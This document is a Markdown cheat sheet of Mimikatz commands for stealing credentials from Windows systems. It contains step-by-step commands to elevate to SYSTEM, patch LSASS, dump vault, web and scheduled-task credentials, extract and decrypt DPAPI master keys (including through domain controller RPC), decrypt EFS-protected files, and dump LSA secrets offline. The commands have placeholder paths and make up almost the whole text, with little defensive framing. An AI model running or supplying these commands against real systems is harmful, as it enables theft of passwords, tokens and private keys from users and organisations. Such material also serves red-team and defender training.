# MIMIKATZ

## Author: https://github.com/gentilkiwi/mimikatz

### Miscellaneous

1) Shows privileges on machine ( Ensure output is "20 OK")

       privilege::debug

2) Impersonate SYSTEM

       token::elevate

De-escalate from SYSTEM

    token::revert

3) Altering LSASS Logic (Dump network share credentials, RDP passwords, etc. Not recommended.)

Prevent LSASS from checking the credential type

    sekurlsa::patch 

### Credentials Dumping

1) Windows Vault stored credentials dumping (passwords and authentication tokens)

       vault::cred

2) Web Credentials Dumping

       vault::list

3) Extract Credentials with DPAPI

        dpapi::cred /in"%appdata%\Microsoft\Credentials\85HJK6B5J456KJ46KJ546435H3JK"

#### If dwFlags includes CRYPTPROTECT_SYSTEM, the blob is protected by the system and cannot be decrypted by a standard user. The guidMasterKey indicates the necessary master key for decryption.

Extract the master key

        dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-341242153252-423423531651-2536513646524-1104\cc354534jkb534jb5-09f8-dd24-fe8fr798fed"

BONUS: RPC for Domain Controllers

#### Domain controllers can decrypt master keys for authorized users using the RPC service.

        dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-341242153252-423423531651-2536513646524-1104\cc354534jkb534jb5-09f8-dd24-fe8fr798fed" /rpc

Final decryption

        dpapi::cred /in"%appdata%\Microsoft\Credentials\85HJK6B5J456KJ46KJ546435H3JK"

4) Decrypt Encrypted File System (EFS) Files

Decrypting EFS files involves:

#### 1) Retrieving and exporting the necessary certificate

#### 2) Locating and exporting the associated private key

#### 3) Decrypting the master key using the user password

#### 4) Using the decrypted master key to decrypt the private key

#### 5) Applying the decrypted private key to access the encrypted file

### PREREQUISITES:

#### 1) Encrypted file(s) access on a Windows System

#### 2) User's systemCertificates, Crypto and Protect folders. Location:

       C:\Users\USERNAME\AppData\Roaming\Microsoft

#### 3) Master key or a way to decrypt it. It can be any of the following: User's password, SHA1, NTLM, Domain Backup Key or a memory dump. We will use a password for this example.

### STEPS:

##### 1) Get information about the encrypted file (Provides details like the certificate's fingerprint for example)

       cipher /c "C:\Users\USERNAME\Documents\encrypted.txt"

##### 2) Export the certificate (This command saves the certificate to a .der file)

       crypto::system /file:"C:\Users\USERNAME\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\G89ED7G8DF6G8DGDF9878GV98DF" /export

##### 3) Locate and export the Private Key

       dpapi::capi /in:"C:\Users\USERNAME\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-22353253535-164576453735-12352462464-1001\78fed6gf87edg687e6gg_e7fgegferger-jj54-dd09-214f-fwesfsefs"

#### TIP: Check if the pUniqueName field matches the container name from the certificate export step

##### 4) Decrypt the Master Key

       dpapi::masterkey /in:"C:\Users\USERNAME\AppData\Roaming\Microsoft\Protect\S-1-5-21-22353253535-164576453735-12352462464-1001\1oiknjui1jkhui-4771-4578-o90x-fefs89f7s9" /password:USERPASS

##### 5) Decrypt the Private Key

       dpapi::capi /masterkey:DECRYPTED_MASTERKEY /in:"C:\Users\USERNAME\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-22353253535-164576453735-12352462464-1001\78fed6gf87edg687e6gg_e7fgegferger-jj54-dd09-214f-fwesfsefs"

##### 6) Decrypt the EFS file (Use the decrypted key. This step may involve using additional tools or scripts to apply the private key and decrypt the file content)

5) Scheduled Tasks Credentials Dumping (Various Methods)

### 1: Vault Credentials Method

#### After creating a scheduled task, Windows stores a copy of the task credential in the owner's credential vault. Use mimikatz to dump them.

       vault::cred 

OR

       sekurlsa::credman 

OR 

       sekurlsa::logonpasswords

### 2: Elevating to SYSTEM

#### To access system credentials, elevate to SYSTEM and request the credentials.

       privilege::debug

       token::elevate

       vault::cred 

#### To expose the credential, use the patch option:

       vault::cred /patch

### 3: DPAPI Method

#### List the directory contents 

       dir /a %systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

#### Decrypt the credential blob with Mimikatz

       dpapi::cred /in:"%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\AA89A7SDFASFDAS9879A87FD9C"

### 4: Extracting DPAPI Master Keys

#### Extract and use DPAPI master keys

       sekurlsa::dpapi

#### Use the master key to decrypt the credential blob

       dpapi::cred /in:"%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\AA89A7SDFASFDAS9879A87FD9C" /masterkey:35jknb65nj3k4b6jh43b6jhvb43jh6vhj45v64jh5kj37ghjh8g6jhg9j78hg9j6hjh645g63j535235i23kjh

### 5: Offline Method

#### To retrieve credentials offline, dump secrets from SYSTEM and SECURITY files

       lsadump::secrets /system:c:\temp\SYSTEM /security:c:\temp\SECURITY

#### Extract and decrypt master key

       dpapi::masterkey /in:"%systemroot%\System32\Microsoft\Protect\S-1-5-18\User\5n3j5hb-f998-ss09-24fd-ff53-4234235r235r2 /system:wf97s98f7wse98f7w9esf79we

#### Decrypt the credential blob

       dpapi::cred /in:"%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\AA89A7SDFASFDAS9879A87FD9C"

